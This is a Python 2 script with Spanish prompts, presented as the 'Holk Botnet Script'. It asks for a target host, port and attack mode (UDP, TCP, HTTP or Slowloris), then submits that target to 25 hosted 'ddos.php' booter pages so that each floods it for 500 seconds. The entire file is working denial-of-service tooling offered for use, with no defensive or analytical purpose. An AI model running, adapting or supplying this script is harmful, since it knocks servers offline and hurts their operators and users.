import mechanize
import sys
import re

print "\n"
print "                       Holk Botnet Script beta 0.1.0\n";

print "	  88   88   .d8b.   NNNNNN  88       	88      88    88";
print "	  88, ,88  d8' '8b    88    88       	88      88,  ,88 ";
print "	  00ooo88  88ooo88    88    88       	88      00oooo88  ";
print "	  88   88  88~~~88    88    88b      	88b     88    88  ";
print "	  88   88  88   88  NNNNNN  88NNNN   	88NNNN  88    88  ";

print "	  ======================================================\n\n\n";

try:
	hostname = sys.argv[1]
	port = sys.argv[2]

except:
	hostname = sys.argv[0]
	port = sys.argv[1]

print "\n\n Por favor elije uno de los siguientes modos de ataque:\n"
print " 1- UDP"
print " 2- TCP"
print " 3- HTTP"
print " 4- SLOWLORIS\n"

mode = raw_input('\n\n Por favor escribe el numero: ')

try:
	if (mode == "1"):
		mode = "UDP"
	if (mode == "2"):
		mode = "TCP"
	if (mode == "3"):
		mode = "HTTP"
	if (mode == "4"):
		mode = "SLOWLORIS"

except:
	pass

print "\n"
print " Atacando Servidor.............\n\n"

br = mechanize.Browser()

numerosalv = 1

while (numerosalv <= 25):

	response = br.open("http://holkddos" + str(numerosalv) + ".webcindario.com/ddos.php")

	rp_data = response.get_data()
	rp_data = re.sub(r'<optgroup label=".+">', "", rp_data)
	response.set_data(rp_data)
	br.set_response(response)

	br.select_form(nr=0)

	br.form['host'] = hostname
	br.form['port'] = port
	br.form['time'] = '500'
	br.form['type'] = [mode]

	br.submit()

	numerosalv = numerosalv + 1

print " Servidor Atacado , no estoy seguro de que haya caido"
exit()